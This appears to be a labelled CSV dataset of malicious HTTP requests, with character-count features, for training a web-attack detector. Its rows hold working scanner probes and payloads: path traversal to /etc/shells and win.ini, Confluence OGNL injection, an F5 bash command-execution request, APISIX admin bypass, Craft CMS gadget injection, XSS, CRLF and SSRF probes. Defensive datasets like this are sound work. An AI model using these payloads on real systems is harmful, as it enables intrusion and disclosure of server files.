method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class 
POST,/login.jsp,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType }  }} fragment FullType on __Type { kind name description fields(includeDeprecated: false) { name description args { ...InputValue } type { ...TypeRef } } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: false) { name description } possibleTypes { ...TypeRef }} fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue} fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }}""}",0,10,0,2,112,0,bad
POST,/graphiql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType }  }} fragment FullType on __Type { kind name description fields(includeDeprecated: false) { name description args { ...InputValue } type { ...TypeRef } } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: false) { name description } possibleTypes { ...TypeRef }} fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue} fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }}""}",0,10,0,2,112,0,bad
GET,/login.jsp,,0,0,0,0,0,0,bad
POST,/playground,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType }  }} fragment FullType on __Type { kind name description fields(includeDeprecated: false) { name description args { ...InputValue } type { ...TypeRef } } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: false) { name description } possibleTypes { ...TypeRef }} fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue} fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }}""}",0,10,0,2,112,0,bad
POST,/gql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType }  }} fragment FullType on __Type { kind name description fields(includeDeprecated: false) { name description args { ...InputValue } type { ...TypeRef } } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: false) { name description } possibleTypes { ...TypeRef }} fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue} fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }}""}",0,10,0,2,112,0,bad
POST,/index.php?graphql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType }  }} fragment FullType on __Type { kind name description fields(includeDeprecated: false) { name description args { ...InputValue } type { ...TypeRef } } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: false) { name description } possibleTypes { ...TypeRef }} fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue} fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }}""}",0,10,0,2,112,0,bad
GET,/ad.js,,0,0,0,0,0,0,bad
GET,/adminer-4.3.0.php,,0,0,0,0,0,0,bad
GET,/adminer-4.3.0-en.php,,0,0,0,0,0,0,bad
GET,/adminer-4.3.0-mysql-en.php,,0,0,0,0,0,0,bad
GET,/adminer-4.3.0-mysql.php,,0,0,0,0,0,0,bad
GET,/adminer-4.3.1.php,,0,0,0,0,0,0,bad
GET,/adminer-4.5.0-mysql.php,,0,0,0,0,0,0,bad
GET,/adminer-4.6.0.php,,0,0,0,0,0,0,bad
GET,/adminer-4.6.0-en.php,,0,0,0,0,0,0,bad
GET,/adminer-4.6.0-mysql-en.php,,0,0,0,0,0,0,bad
GET,/adminer-4.6.0-mysql.php,,0,0,0,0,0,0,bad
GET,/0594029262,,0,0,0,0,0,0,bad
GET,/admin/,,0,0,0,0,0,0,bad
GET,/bal,,0,0,0,0,0,0,bad
GET,/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fshells,,0,0,0,0,0,0,bad
GET,/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells,,0,0,0,0,0,0,bad
GET,/qV42XXrrsq.jsp,,0,0,0,0,0,0,bad
POST,/v1/graphql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType }  }} fragment FullType on __Type { kind name description fields(includeDeprecated: false) { name description args { ...InputValue } type { ...TypeRef } } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: false) { name description } possibleTypes { ...TypeRef }} fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue} fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }}""}",0,10,0,2,112,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/license.txt,,0,0,0,0,0,0,bad
GET,/robots.txt,,0,0,0,0,0,0,bad
GET,/README.md,,0,0,0,0,0,0,bad
GET,/channel/favicon.ico,,0,0,0,0,0,0,bad
GET,/kzdfjope8gxm.php,,0,0,0,0,0,0,bad
GET,/kzdfjope8gxm.jsp,,0,0,0,0,0,0,bad
GET,/login.jsp,,0,0,0,0,0,0,bad
GET,/adminer.php,,0,0,0,0,0,0,bad
GET,/adminer-4.3.1-mysql-en.php,,0,0,0,0,0,0,bad
GET,/adminer-4.3.1-mysql.php,,0,0,0,0,0,0,bad
GET,/adminer-4.4.0.php,,0,0,0,0,0,0,bad
GET,/adminer-4.4.0-en.php,,0,0,0,0,0,0,bad
GET,/adminer-4.6.1-mysql-en.php,,0,0,0,0,0,0,bad
GET,/adminer-4.6.2-mysql-en.php,,0,0,0,0,0,0,bad
GET,/adminer-4.6.2-mysql.php,,0,0,0,0,0,0,bad
GET,/apisix/admin/services/,,0,0,0,0,0,0,bad
POST,/v2/graphql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType }  }} fragment FullType on __Type { kind name description fields(includeDeprecated: false) { name description args { ...InputValue } type { ...TypeRef } } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: false) { name description } possibleTypes { ...TypeRef }} fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue} fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }}""}",0,10,0,2,112,0,bad
POST,/ng/auth,user_id=074625&token=76ccec7e-33f2-4c16-bf35-5816ab37939b,0,0,0,0,0,0,bad
POST,/console,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType }  }} fragment FullType on __Type { kind name description fields(includeDeprecated: false) { name description args { ...InputValue } type { ...TypeRef } } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: false) { name description } possibleTypes { ...TypeRef }} fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue} fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }}""}",0,10,0,2,112,0,bad
GET,/4415681420,,0,0,0,0,0,0,bad
GET,/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells,,0,0,0,0,0,0,bad
GET,/Gwz8aPVweR.php,,0,0,0,0,0,0,bad
GET,/docs/LICENSE.md,,0,0,0,0,0,0,bad
GET,/exestyles.css,,0,0,0,0,0,0,bad
GET,/LICENSE.TXT,,0,0,0,0,0,0,bad
GET,/calendar-bundle/README.md,,0,0,0,0,0,0,bad
GET,/ad.php,,0,0,0,0,0,0,bad
GET,/Adminer.php,,0,0,0,0,0,0,bad
GET,/adminer-4.2.5.php,,0,0,0,0,0,0,bad
GET,/adminer-4.4.0-mysql-en.php,,0,0,0,0,0,0,bad
GET,/adminer-4.5.0-mysql-en.php,,0,0,0,0,0,0,bad
GET,/adminer-4.6.1-en.php,,0,0,0,0,0,0,bad
GET,/adminer-4.6.2.php,,0,0,0,0,0,0,bad
GET,/adminer-4.6.2-en.php,,0,0,0,0,0,0,bad
POST,/api/graphiql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType }  }} fragment FullType on __Type { kind name description fields(includeDeprecated: false) { name description args { ...InputValue } type { ...TypeRef } } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: false) { name description } possibleTypes { ...TypeRef }} fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue} fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }}""}",0,10,0,2,112,0,bad
POST,/apisix/batch-requests,"{""headers"":{""X-Real-IP"":""127.0.0.1"",""Content-Type"":""application/json""},""timeout"":1500,""pipeline"":[{""method"":""GET"",""path"":""/apisix/admin/services/?api_key=edd1c9f034335f136f87ad84b625c8f1""}]}",0,22,0,0,0,0,bad
GET,/apple-touch-icon.png,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/kzdfjope8gxm,,0,0,0,0,0,0,bad
GET,/NbQQDhbqt2.html,,0,0,0,0,0,0,bad
GET,/adminer-4.2.5-en.php,,0,0,0,0,0,0,bad
GET,/login.jsp,,0,0,0,0,0,0,bad
GET,/common.js,,0,0,0,0,0,0,bad
GET,/adminer-4.4.0-mysql.php,,0,0,0,0,0,0,bad
POST,/v3/graphql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType }  }} fragment FullType on __Type { kind name description fields(includeDeprecated: false) { name description args { ...InputValue } type { ...TypeRef } } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: false) { name description } possibleTypes { ...TypeRef }} fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue} fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }}""}",0,10,0,2,112,0,bad
POST,/api/graphql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType }  }} fragment FullType on __Type { kind name description fields(includeDeprecated: false) { name description args { ...InputValue } type { ...TypeRef } } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: false) { name description } possibleTypes { ...TypeRef }} fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue} fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }}""}",0,10,0,2,112,0,bad
GET,/balancer-manager,,0,0,0,0,0,0,bad
GET,/blogs/apple-touch-icon.png,,0,0,0,0,0,0,bad
GET,/favicon.ico,,0,0,0,0,0,0,bad
GET,/images/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells,,0,0,0,0,0,0,bad
GET,/adminer-4.2.5-mysql.php,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/config/,,0,0,0,0,0,0,bad
GET,/jkstatus;a,,0,0,0,0,0,0,bad
GET,/bonita/API/portal/page/;i18ntranslation,,0,0,0,0,0,0,bad
POST,/wp-json/buddypress/v1/signup,"{""user_login"":""fknoqd"",""password"":""wqorza"",""user_name"":""fknoqd"",""user_email"":""xowhxz@test.com""}",0,16,0,0,0,0,bad
GET,/web/apple-touch-icon.png,,0,0,0,0,0,0,bad
GET,/adminer-4.6.1.php,,0,0,0,0,0,0,bad
POST,/v3/graphiql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType }  }} fragment FullType on __Type { kind name description fields(includeDeprecated: false) { name description args { ...InputValue } type { ...TypeRef } } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: false) { name description } possibleTypes { ...TypeRef }} fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue} fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }}""}",0,10,0,2,112,0,bad
GET,/locale/base/TRANSLATIONS.md,,0,0,0,0,0,0,bad
GET,/_adminer.php,,0,0,0,0,0,0,bad
GET,/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<h1>testing</h1>,,0,0,0,0,0,0,bad
GET,/webpack.config.dev.js,,0,0,0,0,0,0,bad
GET,/admin/LiveLogSettingsServlet?Action=read,,0,0,0,0,0,0,bad
GET,/vpn/../vpns/cfg/smb.conf,,0,0,0,0,0,0,bad
POST,/saml/sp/acs?tgname=a,SAMLResponse=<svg/onload=alert(1)>,0,0,0,1,0,0,bad
GET,/adminer-4.5.0.php,,0,0,0,0,0,0,bad
GET,/jsp/help-sb-download.jsp?sbFileName=../../../../../etc/shells,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/adminer-4.6.1-mysql.php,,0,0,0,0,0,0,bad
POST,/auth/requestreset,"{""user"":{""$func"": ""var_dump""}}",0,6,0,0,1,0,bad
GET,/upload,,0,0,0,0,0,0,bad
GET,/v1.0,,0,0,0,0,0,0,bad
GET,/api/v2,,0,0,0,0,0,0,bad
GET,/api/v5,,0,0,0,0,0,0,bad
GET,/v5/api,,0,0,0,0,0,0,bad
GET,/include/js/tiny_mce/tiny_mce.js,,0,0,0,0,0,0,bad
GET,/htdocs/favicon.ico,,0,0,0,0,0,0,bad
GET,/catalog/images/category_dvd_movies.gif,,0,0,0,0,0,0,bad
GET,/%0a.example.com,,0,0,0,0,0,0,bad
GET,/s/1xugdXf2gy4LHvZThieDT4/_/;/WEB-INF/decorators.xml,,0,0,0,0,0,0,bad
GET,/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../,,0,0,0,0,2,0,bad
POST,/pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1,<appfwprofile><login></login></appfwprofile>,0,0,0,0,0,0,bad
GET,/adminer-4.5.0-en.php,,0,0,0,0,0,0,bad
POST,/v1/graphiql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType }  }} fragment FullType on __Type { kind name description fields(includeDeprecated: false) { name description args { ...InputValue } type { ...TypeRef } } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: false) { name description } possibleTypes { ...TypeRef }} fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue} fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }}""}",0,10,0,2,112,0,bad
GET,/clientaccesspolicy.xml,,0,0,0,0,0,0,bad
GET,/v1/agent/self,,0,0,0,0,0,0,bad
GET,/api,,0,0,0,0,0,0,bad
GET,/v1,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/api/v3,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/index.php,"action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={""name"":""test[userCondition]"",""as zxc"":{""class"":""\\GuzzleHttp\\Psr7\\FnStream"", ""__construct()"": [{""close"":null}],""_fn_close"":""phpinfo""}}",0,18,0,1,3,0,bad
GET,/global/fancybox/blank.gif,,0,0,0,0,0,0,bad
GET,/.github/ISSUE_TEMPLATE.md,,0,0,0,0,0,0,bad
GET,/gulpfile.js,,0,0,0,0,0,0,bad
GET,/CHANGELOG.md,,0,0,0,0,0,0,bad
GET,/installer/css/style.css,,0,0,0,0,0,0,bad
GET,/server-info.action?bootstrapStatusProvider.applicationConfig.test=test,,0,0,0,0,0,0,bad
GET,/.well-known/apple-app-site-association,,0,0,0,0,0,0,bad
POST,/doLogin,"------WebKitFormBoundarylpehsKFWn7j5A9VK
Content-Disposition: form-data; name=""uid""

pHqghUme
------WebKitFormBoundarylpehsKFWn7j5A9VK
Content-Disposition: form-data; name=""passw""

u]H[ww6KrA9F.x-F
------WebKitFormBoundarylpehsKFWn7j5A9VK--
",0,4,10,0,4,1,bad
GET,/XAoMMEX0g1.asp,,0,0,0,0,0,0,bad
GET,/v1.1,,0,0,0,0,0,0,bad
GET,/v1/api,,0,0,0,0,0,0,bad
GET,/v2/api,,0,0,0,0,0,0,bad
GET,/v3/api,,0,0,0,0,0,0,bad
GET,/crossdomain.xml,,0,0,0,0,0,0,bad
GET,/CONTRIBUTORS.md,,0,0,0,0,0,0,bad
GET,/__debug__/render_panel/?store_id=1,,0,0,0,0,0,0,bad
GET,/core-bundle/LIMITATIONS.md,,0,0,0,0,0,0,bad
GET,/adminer-4.3.1-en.php,,0,0,0,0,0,0,bad
GET,/comments-bundle/src/Resources/public/approved.svg,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/%24%7B%28%40%63%6F%6D%2E%6F%70%65%6E%73%79%6D%70%68%6F%6E%79%2E%77%65%62%77%6F%72%6B%2E%53%65%72%76%6C%65%74%41%63%74%69%6F%6E%43%6F%6E%74%65%78%74%40%67%65%74%52%65%73%70%6F%6E%73%65%28%29%2E%73%65%74%48%65%61%64%65%72%28%22%58%2D%43%6F%6E%66%6C%75%65%6E%63%65%2D%56%75%6C%6E%22%2C%22%73%6B%79%6F%78%77%6A%79%6C%65%50%50%50%50%50%72%6F%76%77%62%62%64%68%65%75%22%2E%72%65%70%6C%61%63%65%41%6C%6C%28%22%50%22%2C%22%51%22%29%29%29%7D/,,0,8,0,4,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/images/index.html,,0,0,0,0,0,0,bad
GET,/api/v4,,0,0,0,0,0,0,bad
GET,/server-info.action?bootstrapStatusProvider.applicationConfig.test=test,,0,0,0,0,0,0,bad
GET,/info,,0,0,0,0,0,0,bad
GET,/adminer-4.2.5-mysql-en.php,,0,0,0,0,0,0,bad
GET,/doc/2.1_Beta.txt,,0,0,0,0,0,0,bad
GET,/images/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells,,0,0,0,0,0,0,bad
GET,/v2/_catalog,,0,0,0,0,0,0,bad
POST,/api/content/,"--------------------------eee809bcbe293e32
Content-Disposition: form-data; name=""name""; filename=""/.//..//..//..//..//..//..//..//..//..//tmx/2003355592""
Content-Type: text/plain

1zzztest1
--------------------------eee809bcbe293e32--",0,4,27,0,4,0,bad
GET,/themes/Default/img/1px_444444.jpg,,0,0,0,0,0,0,bad
POST,/v2/graphiql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType }  }} fragment FullType on __Type { kind name description fields(includeDeprecated: false) { name description args { ...InputValue } type { ...TypeRef } } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: false) { name description } possibleTypes { ...TypeRef }} fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue} fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }}""}",0,10,0,2,112,0,bad
GET,/LIMITATIONS.md,,0,0,0,0,0,0,bad
GET,/system/refinery/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvc2hlbGxzIiwgIm91dCJdXQ%3d%3d/test.jpeg,,0,0,0,0,0,1,bad
GET,/api/v1,,0,0,0,0,0,0,bad
GET,/apple-app-site-association,,0,0,0,0,0,0,bad
GET,/%24%7B%28%40%63%6F%6D%2E%6F%70%65%6E%73%79%6D%70%68%6F%6E%79%2E%77%65%62%77%6F%72%6B%2E%53%65%72%76%6C%65%74%41%63%74%69%6F%6E%43%6F%6E%74%65%78%74%40%67%65%74%52%65%73%70%6F%6E%73%65%28%29%2E%73%65%74%48%65%61%64%65%72%28%22%58%2D%43%6F%6E%66%6C%75%65%6E%63%65%2D%56%75%6C%6E%22%2C%22%65%72%72%66%6C%68%74%65%6F%73%50%50%50%50%50%62%74%7A%71%70%66%62%6E%70%6F%22%2E%72%65%70%6C%61%63%65%41%6C%6C%28%22%50%22%2C%22%51%22%29%29%29%7D/,,0,8,0,4,0,0,bad
GET,/composer/Generator/TESTING.txt,,0,0,0,0,0,0,bad
GET,/tst141921,,0,0,0,0,0,0,bad
GET,/bitrix_server_test.php,,0,0,0,0,0,0,bad
GET,/VERSIONING.md,,0,0,0,0,0,0,bad
GET,/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells,,0,0,0,0,0,0,bad
GET,/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua,,0,0,0,0,2,0,bad
GET,/header.jpg,,0,0,0,0,0,0,bad
GET,/resources/lib/jquery.ui/i18n/jquery.ui.datepicker-af.js,,0,0,0,0,0,0,bad
GET,/login.jsp,,0,0,0,0,0,0,bad
GET,/core/CHANGELOG.txt,,0,0,0,0,0,0,bad
POST,/doLogin,"------WebKitFormBoundaryqX2oMurBA59cgBsN
Content-Disposition: form-data; name=""uid""

pHqghUme
------WebKitFormBoundaryqX2oMurBA59cgBsN
Content-Disposition: form-data; name=""passw""

u]H[ww6KrA9F.x-F
------WebKitFormBoundaryqX2oMurBA59cgBsN--
",0,4,10,0,4,1,bad
GET,/calendar-bundle/UPGRADE.md,,0,0,0,0,0,0,bad
GET,/sitemap.xml,,0,0,0,0,0,0,bad
GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin,,0,0,0,0,3,0,bad
GET,/htmlarea/ckeditor_s9y_plugin.js,,0,0,0,0,0,0,bad
GET,/v4/api,,0,0,0,0,0,0,bad
GET,/ClientAccessPolicy.xml,,0,0,0,0,0,0,bad
GET,/render/http://bxss.me/t/fit.txt,,0,0,0,0,0,0,bad
GET,/images/panel_off.gif,,0,0,0,0,0,0,bad
GET,/phpBB/assets/css/font-awesome.min.css,,0,0,0,0,0,0,bad
GET,/LICENSE.txt,,0,0,0,0,0,0,bad
GET,/api/v2/cmdb/vpn.ssl/settings,,0,0,0,0,0,0,bad
GET,/contao-4.4.30/CHANGELOG.md,,0,0,0,0,0,0,bad
GET,/hsqldb;,,0,0,0,0,0,0,bad
GET,/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells,,0,0,0,0,0,0,bad
GET,/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession,,0,0,0,0,0,0,bad
GET,/DEPRECATED.md,,0,0,0,0,0,0,bad
GET,/calendar-bundle/src/Resources/public/calendar.min.css,,0,0,0,0,0,0,bad
GET,/upload/admin/view/javascript/jquery/flot/jquery.colorhelpers.js,,0,0,0,0,0,0,bad
GET,/kzdfjope8gxm.html,,0,0,0,0,0,0,bad
GET,/COPYRIGHT.txt,,0,0,0,0,0,0,bad
GET,/ISSUE_TEMPLATE.md,,0,0,0,0,0,0,bad
GET,/go/add-on/business-continuity/api/cruise_config,,0,0,0,0,0,0,bad
GET,/bitrix/redirect.php?goto=https://demo.testfire.net%252F@bxss.me/,,0,0,0,0,0,0,bad
GET,/render?url=http://bxss.me/t/fit.txt,,0,0,0,0,0,0,bad
GET,/login,,0,0,0,0,0,0,bad
GET,/js/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells,,0,0,0,0,0,0,bad
GET,/login,,0,0,0,0,0,0,bad
GET,/debug/pprof/,,0,0,0,0,0,0,bad
GET,/src/Resources/public/mootao.min.js,,0,0,0,0,0,0,bad
GET,/INSTALL.txt,,0,0,0,0,0,0,bad
GET,/core/INSTALL.mysql.txt,,0,0,0,0,0,0,bad
GET,/LetsEncrypt/Index?fileName=/etc/shells,,0,0,0,0,0,0,bad
GET,/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvc2hlbGxzIiwgIm91dCJdXQ%3d%3d/test.jpeg,,0,0,0,0,0,1,bad
GET,/js/date.js,,0,0,0,0,0,0,bad
GET,/users/sign_in,,0,0,0,0,0,0,bad
POST,/pages/doenterpagevariables.action,queryString=bbbaaa\u0027%2b#{3*33333}%2b\u0027bbbaaa,0,0,0,0,0,0,bad
GET,/http://bxss.me/t/fit.txt,,0,0,0,0,0,0,bad
GET,/images/general/cvv.gif,,0,0,0,0,0,0,bad
GET,/sitemap.xml.gz,,0,0,0,0,0,0,bad
GET,/global/license.txt,,0,0,0,0,0,0,bad
GET,/admin,,0,0,0,0,0,0,bad
POST,/mgmt/tm/util/bash,"{""utilCmdArgs"": ""-c 'id'"", ""command"": ""run""}",2,8,0,0,4,0,bad
GET,/CONTRIBUTING.md,,0,0,0,0,0,0,bad
GET,/cluster/cluster,,0,0,0,0,0,0,bad
GET,/vendor/elgg/elgg/CONTRIBUTING.md,,0,0,0,0,0,0,bad
GET,/k4oYMcSWWD.aspx,,0,0,0,0,0,0,bad
GET,/h2-console/,,0,0,0,0,0,0,bad
POST,/pages/doenterpagevariables.action,queryString=bbbaaa\u0027%2b#{3*33333}%2b\u0027bbbaaa,0,0,0,0,0,0,bad
GET,/bitrix/components/bitrix/photogallery_user/templates/.default/galleries_recalc.php?AJAX=Y&arParams[PERMISSION]=W&arParams[IBLOCK_ID]=1%00%27}};top[%27al%27%2B%27ert%27](31337);if(1){//,,5,0,0,2,0,0,bad
GET,/readme.html,,0,0,0,0,0,0,bad
GET,/js/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells,,0,0,0,0,0,0,bad
GET,/v1/agent/self,,0,0,0,0,0,0,bad
GET,/locales/en/button/mblue_off.gif,,0,0,0,0,0,0,bad
GET,/global/css/ui.daterangepicker.css,,0,0,0,0,0,0,bad
GET,/themes/blueSilence/screenshot.jpg,,0,0,0,0,0,0,bad
GET,/COPYING.txt,,0,0,0,0,0,0,bad
GET,/docs/databases/sqlite.txt,,0,0,0,0,0,0,bad
GET,/DEVELOPMENT.md,,0,0,0,0,0,0,bad
GET,/LetsEncrypt/Index?fileName=c:\windows\win.ini,,0,0,0,0,0,0,bad
